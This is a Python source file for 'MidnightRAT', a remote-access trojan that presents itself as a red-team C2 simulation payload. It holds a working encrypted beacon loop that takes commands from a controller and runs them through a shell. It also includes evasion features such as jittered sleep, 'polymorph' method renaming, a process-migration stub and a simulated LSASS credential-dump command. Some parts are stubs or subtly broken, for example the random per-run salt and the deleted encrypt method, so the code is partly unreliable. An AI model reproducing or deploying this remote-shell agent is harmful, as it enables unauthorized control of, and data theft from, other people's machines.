#!/usr/bin/env python3
"""
Author: Syed Sharjeel Zaidi
Tool: MidnightRAT 
Purpose: Red team payload for C2 communication simulation (authorized use only)
License: MIT License
"""

import os
import socket
import struct
import random
import string
import time
import platform
import subprocess
import uuid
import json
import psutil

from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


class SecurePayload:
    def __init__(self, c2_host: str, c2_port: int, shared_secret: bytes = b"k3yshar3dsecr3t123!"):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.secret = shared_secret
        self.salt = uuid.uuid4().bytes[:16]
        self.backend = default_backend()
        self.key = self.derive_key(self.secret, self.salt)

    def derive_key(self, secret: bytes, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        return kdf.derive(secret)

    def encrypt(self, data: bytes) -> bytes:
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=self.backend)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return iv + ciphertext

    def decrypt(self, data: bytes) -> bytes:
        iv = data[:16]
        ciphertext = data[16:]
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=self.backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(padded_plaintext) + unpadder.finalize()

    def migrate_process(self) -> bool:
        current_pid = os.getpid()
        best_proc = None
        min_score = float('inf')

        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
            try:
                score = random.random() * (proc.cpu_percent() + 1)
                if proc.info['pid'] != current_pid and proc.info['name'] != 'python':
                    if score < min_score:
                        min_score = score
                        best_proc = proc
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        return bool(best_proc)

    def polymorph(self) -> None:
        alias = ''.join(random.choices(string.ascii_letters, k=8))
        setattr(self, alias, self.encrypt)
        try:
            del self.encrypt
        except AttributeError:
            pass


class MidnightRAT(SecurePayload):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.last_action = time.time()
        self.migration_count = 0

    def get_sleep_interval(self) -> int:
        jitter = random.uniform(0.1, 0.5)
        base = 300
        adjustment = base * (1 - abs(time.time() - self.last_action) / base) ** 2
        return int(base + adjustment + jitter)

    def run_command(self, cmd_type: str, cmd_data: str) -> bytes:
        result: bytes = b"[ERROR] Unknown command"

        if cmd_type == "syscall":
            try:
                result = subprocess.check_output(cmd_data, shell=True)
            except Exception as e:
                result = f"[ERROR] {str(e)}".encode()

        elif cmd_type == "sleep":
            try:
                delay = int(cmd_data)
                if 60 <= delay <= 86400:
                    self.last_action = time.time() - (delay / 2)
                    result = f"[INFO] Sleep adjusted to {delay} seconds.".encode()
            except Exception:
                result = b"[ERROR] Invalid sleep interval"

        elif cmd_type == "lsass":
            if platform.system() == "Windows":
                result = b"[SIMULATED] LSASS dump not implemented."
            else:
                result = b"[ERROR] LSASS dump not supported on this OS."

        return result


def main() -> None:
    agent = MidnightRAT(c2_host="127.0.0.1", c2_port=8080)  # Safe test config

    while True:
        try:
            with socket.create_connection((agent.c2_host, agent.c2_port)) as conn:
                agent.polymorph()

                while True:
                    time.sleep(agent.get_sleep_interval())

                    if random.random() < 0.1 and agent.migrate_process():
                        agent.migration_count += 1
                        continue

                    raw_len = conn.recv(4)
                    if not raw_len:
                        break

                    length = struct.unpack('>I', raw_len)[0]
                    data = conn.recv(length)
                    decrypted = agent.decrypt(data)

                    cmd_json = json.loads(decrypted.decode(errors="ignore"))
                    result = agent.run_command(cmd_json.get("type", ""), cmd_json.get("data", ""))

                    response = json.dumps({
                        "result": result.decode(errors="ignore"),
                        "migrations": agent.migration_count
                    }).encode()

                    encrypted_resp = agent.encrypt(response)
                    conn.sendall(struct.pack('>I', len(encrypted_resp)) + encrypted_resp)

        except Exception:
            time.sleep(random.randint(30, 300))


if __name__ == "__main__":
    main()
